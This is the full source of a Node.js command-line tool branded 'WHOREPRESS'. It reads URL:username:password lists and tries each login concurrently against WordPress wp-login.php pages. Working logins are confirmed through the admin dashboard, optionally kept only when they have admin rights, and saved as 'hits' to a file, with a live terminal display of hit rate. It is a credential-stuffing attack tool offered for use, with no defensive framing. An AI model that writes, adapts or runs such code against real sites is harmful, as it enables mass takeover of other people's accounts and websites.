#!/usr/bin/env node

import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import fs from 'fs';
import readline from 'readline';
import colors from 'colors';
import { banner } from './constant/banner';
import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
import blessed from 'blessed';
import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';
import semaphore from 'semaphore';
import { exec } from 'child_process';
import ncu from 'npm-check-updates';

const argv = yargs(hideBin(process.argv))
    .command('upgrade', 'Upgrade to the latest version', {}, async () => {
        await checkForUpdates();
    })
    .option('admin-only', {
        type: 'boolean',
        description: 'Check only admin users'
    })
    .option('output', {
        type: 'string',
        description: 'Output file for results',
        default: 'hits.txt'
    })
    .option('debug', {
        type: 'boolean',
        description: 'Enable debug mode'
    })
    .option('concurrency', {
        type: 'number',
        description: 'Number of concurrent requests',
        default: 5
    })
    .demandCommand(1, 'You need to provide a filename')
    .help()
    .argv;

const filename: string = argv._[0] as string;
const adminOnly: boolean = argv['admin-only'];
const outputFile: string = argv.output;
const debugMode: boolean = argv.debug;
const concurrency: number = argv.concurrency;

const screen = blessed.screen({
    smartCSR: true,
    title: 'WHOREPRESS'
});

screen.key(['C-c'], function (_ch: any, _key: any) {
    return process.exit(0);
});

const logBox = blessed.box({
    top: 'center',
    left: 'center',
    width: '90%',
    height: '80%',
    content: banner(),
    tags: true,
    scrollable: true,
    size: 'auto',
    alwaysScroll: true,
    scrollbar: {
        ch: ' ',
        inverse: true
    },
    border: {
        type: 'line'
    },
    style: {
        fg: 'white',
        bg: 'black',
        border: {
            fg: '#f0f0f0'
        }
    }
});

screen.append(logBox);

class Wordpress implements IWordpress {
    public hits: number;
    public bad: number;
    public cpm: number;
    public start: number;
    public logBuffer: LogEntry[];
    private client: any;
    private sem: any;

    constructor(concurrency: number) {
        this.hits = 0;
        this.bad = 0;
        this.cpm = 0;
        this.start = Date.now();
        this.logBuffer = [];
        this.client = wrapper(axios.create({ jar: new CookieJar() }));
        this.sem = semaphore(concurrency);
        this.updateTitle();
        this.calculateCpm();
    }

    displayUI(): void {
        logBox.setContent(banner() + this.getLogContent());
        screen.render();
    }

    getLogContent(): string {
        const recentHits = this.logBuffer.filter(entry => entry.type === 'HIT').slice(-3);
        const recentBads = this.logBuffer.filter(entry => entry.type === 'BAD').slice(-3);
        let content = '\n' + colors.green('Recent Valid Hits:\n');
        recentHits.forEach(entry => {
            content += `${colors.green('[+])')} ${colors.green('HIT')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        content += colors.red('Recent Bad Logins:\n');
        recentBads.forEach(entry => {
            content += `${colors.red('[-]')} ${colors.red('BAD')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        return content;
    }

    async updateTitle(): Promise<void> {
        while (true) {
            const elapsed = new Date(Date.now() - this.start).toISOString().substr(11, 8);
            logBox.setLabel(`[WHOREPRESS] Valid Hits: ${this.hits} | Bad: ${this.bad} | CPM: ${this.cpm} | Time elapsed: ${elapsed}`);
            screen.render();
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }

    async calculateCpm(): Promise<void> {
        while (true) {
            const oldHits = this.hits;
            await new Promise(resolve => setTimeout(resolve, 4000));
            this.cpm = (this.hits - oldHits) * 15;
        }
    }

    async checkAccount(url: string, username: string, password: string): Promise<void> {
        this.sem.take(async () => {
            try {
                const payload = new URLSearchParams({
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                    'testcookie': '1'
                });

                const headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Referer': url
                };

                if (!/^https?:\/\//i.test(url)) {
                    url = 'https://' + url;
                }

                const response = await this.client.post(url, payload.toString(), {
                    headers,
                    maxRedirects: 0,
                    validateStatus: (status) => status === 302 || status === 200,
                    withCredentials: true
                });

                const cookies = response.headers['set-cookie'];
                if (debugMode) {
                    console.log('Response headers:', response.headers);
                }

                if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
                    const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
                    const cookieHeader = cookies.join('; ');

                    if (debugMode) {
                        console.log('Attempting to access dashboard URL:', dashboardUrl);
                    }

                    const r = await this.client.get(dashboardUrl, {
                        headers: {
                            ...headers,
                            'Cookie': cookieHeader
                        },
                        withCredentials: true
                    });

                    if (debugMode) {
                        console.log('Final response data:', r.data);
                    }

                    let isAdmin = true;

                    if (adminOnly) {
                        isAdmin = r.data.includes("plugin-install.php");
                    }

                    if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
                        this.hits += 1;
                        this.logBuffer.push({ type: 'HIT', url, username, password });
                        fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
                    } else {
                        this.bad += 1;
                        this.logBuffer.push({ type: 'BAD', url, username, password });
                    }
                } else {
                    this.bad += 1;
                    this.logBuffer.push({ type: 'BAD', url, username, password });
                }
            } catch (error) {
                if (debugMode) {
                    console.error(`Error checking account ${username}@${url}:`, error);
                }
                this.bad += 1;
                this.logBuffer.push({ type: 'BAD', url, username, password });
            } finally {
                this.displayUI();
                this.sem.leave();
            }
        });
    }
}

function showLoadingScreen(): Promise<void> {
    return new Promise((resolve) => {
        const loadingBox = blessed.box({
            top: 'center',
            left: 'center',
            width: '90%',
            height: '80%',
            content: colors.green('Initializing...\n'),
            tags: true,
            border: {
                type: 'line'
            },
            style: {
                fg: 'green',
                bg: 'black',
                border: {
                    fg: 'green'
                }
            }
        });

        screen.append(loadingBox);
        screen.render();

        let loadingMessage = '';
        const loadingInterval = setInterval(() => {
            loadingMessage += '.';
            if (loadingMessage.length > 3) {
                loadingMessage = '';
            }
            loadingBox.setContent(colors.green(`Initializing${loadingMessage}\n`));
            screen.render();
        }, 500);

        setTimeout(() => {
            clearInterval(loadingInterval);
            screen.remove(loadingBox);
            resolve();
        }, 5000); // Simulate a 5-second loading time
    });
}

function readAccounts(filename: string, wp: Wordpress): void {
    const fileStream = fs.createReadStream(filename);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    rl.on('line', (line: string) => {
        const match = line.match(/(https?:\/\/[^\s\/]+\/(?:wp-login\.php|wp-admin|user-new\.php))\s*:\s*([^\s:]+)\s*:\s*([^\s:]+)/);
        if (match) {
            wp.checkAccount(match[1], match[2], match[3]);
        }
    });

    rl.on('close', () => {
    });
}

async function checkForUpdates() {
    console.log(colors.green('Checking for updates...'));

    try {
        const upgrades = await ncu({
            packageFile: 'package.json',
            upgrade: true
        });

        if (upgrades && Object.keys(upgrades).length > 0) {
            console.log(colors.green('Updates available:'));
            for (const pkg in upgrades) {
                console.log(`${pkg}: ${upgrades[pkg]}`);
            }
            console.log(colors.green('Updating...'));

            exec('npm install --global whorepress@latest', (err, stdout, stderr) => {
                if (err) {
                    console.error(colors.red('Error during update:'), err);
                    return;
                }
                console.log(colors.green('Update complete!'));
                console.log(stdout);
                if (stderr) console.error(colors.red(stderr));
            });
        } else {
            console.log(colors.green('You are already using the latest version.'));
        }
    } catch (error) {
        console.error(colors.red('Error checking for updates:'), error);
    }
}

const wp = new Wordpress(concurrency);

showLoadingScreen().then(() => {
    wp.displayUI();
    readAccounts(filename, wp);
});

process.on('SIGINT', () => {
    process.exit();
});
